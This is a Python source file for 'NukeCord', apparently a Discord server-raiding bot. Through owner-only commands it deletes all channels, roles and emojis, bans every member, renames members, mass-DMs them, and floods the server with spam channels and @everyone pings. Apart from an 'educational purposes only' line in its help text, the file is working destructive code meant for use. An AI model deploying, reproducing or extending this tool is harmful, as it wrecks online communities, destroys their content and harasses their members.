import discord
from discord.ext import commands
import json, os
from colorama import Fore as color
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="nc!", intents=intents)
bot.remove_command("help")
print(color.YELLOW + """
                         __    _                                   
                    _wr""        "-q__                             
                 _dP                 9m_     
               _#P                     9#_                         
              d#@                       9#m                        
             d##                         ###                       
            J###                         ###L                      
            {###K                       J###K                      
            ]####K      ___aaa___      J####F                      
        __gmM######_  w#P""   ""9#m  _d#####Mmw__                  
     _g##############mZ_         __g##############m_               
   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             
  a###""          ,Z"#####@" '######"\g          ""M##m            
 J#@"             0L  "*##     ##@"  J#              *#K           
 #"               `#    "_gmwgm_~    dF               `#_          
7F                 "#_   ]#####F   _dK                 JE          
]                    *m__ ##### __g@"                   F          
                       "PJ#####LP"                                 
 `                       0######_                      '           
                       _0########_                                   
     .               _d#####^#####m__              ,              
      "*w_________am#####P"   ~9#####mw_________w*"                  
          ""9@#####@M""           ""P@#####@M""                    



""")
f = open("config.json", "r")
x = f.read()
y = json.loads(x)
TOKEN = y["token"]
q = y["your_id"]
ID = int(q)
print(color.RESET + "[~] Do nc!help to get all commands")

@bot.event 
async def on_ready():
    print(color.GREEN + f"[~] Logged in as {bot.user}")


@bot.event
async def on_command_error(ctx, error):
  return
    
    
@bot.command()
async def help(ctx):
    if ctx.author.id == ID:
        embed = discord.Embed(title="This bot is running NukeCord", description="This is made for educational purposes only! Do never nuke servers of innocent people!\n__**Available commands:**__\n```\nnc!nuke <text>\nnc!alert <text>\nnc!flood <text>\nnc!ban\nnc!nicknames <text>\nnc!roles <text>\nnc!dm <text>\nnc!emojis\n```", color=0x36393e)
        embed.set_thumbnail(url="https://i.vgy.me/8LslSF.png")
        await ctx.send(embed=embed)




@bot.command()
@commands.guild_only()
async def nuke(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except:
                print(color.RED + f"[!] Error deleting {channel.name}")
        await ctx.guild.edit(name=arg)
        x = 100
        while x >= 0:
            ch = await ctx.guild.create_text_channel(arg)
            await ch.send(f"{arg} | @everyone")
            x = int(x) -1
        print(color.GREEN + f"[~] Nuked {ctx.guild.name}")

@bot.command()
@commands.guild_only()
async def alert(ctx, *, arg):
    if ctx.author.id == ID:
        for channel in ctx.guild.channels:
            if type(channel) != discord.channel.TextChannel:
                print("\n")
            else:
                await channel.send(f"{arg} | @everyone")
                
                
@bot.command()
@commands.guild_only()
async def flood(ctx, *, arg):
    if ctx.author.id == ID:
        i = 100
        while i >= 0:
            await ctx.send(arg)
            i = int(i) - 1
        print(color.GREEN + f"[~] Flooded {ctx.channel.name}")

            
@bot.command()
@commands.guild_only()
async def ban(ctx):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                if member == ctx.author:
                    print(color.YELLOW + f"[~] Skipped banning {ctx.author}")
                else:
                    await member.ban(reason=None)
            except:
                print(color.RED + f"[!] Failed banning {member}")
        await msg.add_reaction("✅")
    else:
        return
    
    
@bot.command()
@commands.guild_only()
async def nicknames(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.edit(nick=arg)
            except:
                print(color.RED + f"[!] Failed to change nickname of {member}")
        await msg.add_reaction("✅")
    else:
        return    
            

@bot.command()
@commands.guild_only()
async def roles(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                print(color.RED + f"[!] Failed to delete {role.name}")
        x = 30
        guild = ctx.guild
        while x >= 0:
            await guild.create_role(name=arg)
            x = int(x) - 1
        await msg.add_reaction("✅")
        
@bot.command()
@commands.guild_only()
async def dm(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for member in ctx.guild.members:
            try:
                await member.send(arg)
            except:
                print(color.RED + f"[!] Failed to DM {member}")
        await msg.add_reaction("✅")

        
        
        
@bot.command()
@commands.guild_only()
async def emojis(ctx, *, arg):
    if ctx.author.id == ID:
        msg = ctx.message
        await msg.add_reaction("🔄")
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
            except:
                print(color.RED + f"[!] Failed deleting emoji {emoji.name}")
        await msg.add_reaction("✅")
    else:
        return        
        
        
        
        

bot.run(TOKEN)
